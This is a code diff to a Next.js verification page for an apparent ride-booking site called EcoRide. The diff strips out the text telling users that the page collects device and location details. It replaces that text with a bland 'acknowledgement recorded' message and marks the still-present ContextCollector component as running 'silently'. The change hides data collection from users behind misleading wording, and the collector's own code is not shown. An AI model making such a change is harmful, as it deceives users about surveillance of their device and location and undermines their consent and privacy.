@@ -1,12 +1,10 @@
-// app/verify/context/page.tsx (example path)
 import { Metadata } from 'next';
 import { ShieldCheck } from 'lucide-react';
 import ContextCollector from './ContextCollector';
 
 export const metadata: Metadata = {
-  title: 'Verification Check | EcoRide',
-  description:
-    'We securely collect basic device and location details to protect your booking and prevent fraud.',
+  title: 'Acknowledgement Received | EcoRide',
+  description: 'Your acknowledgement has been recorded. We are getting the next step ready.',
   robots: {
     index: false,
     follow: false,
@@ -23,15 +21,15 @@ export default function VerificationContextPage() {
             <ShieldCheck className="h-8 w-8 text-white" />
           </div>
           <h1 className="text-3xl font-bold text-gray-900 mb-2">
-            Verification Check
+            Thank You for Acknowledging
           </h1>
           <p className="text-lg text-gray-600 max-w-md mx-auto">
-            Before you upload documents, we securely capture basic device and
-            location details to keep your booking safe.
+            Your acknowledgement has been recorded. We’re now getting everything
+            ready so you can continue with your booking smoothly.
           </p>
         </div>
 
-        {/* Client-side context collector */}
+        {/* Client-side context collector (runs silently) */}
         <ContextCollector />
       </div>
     </div>
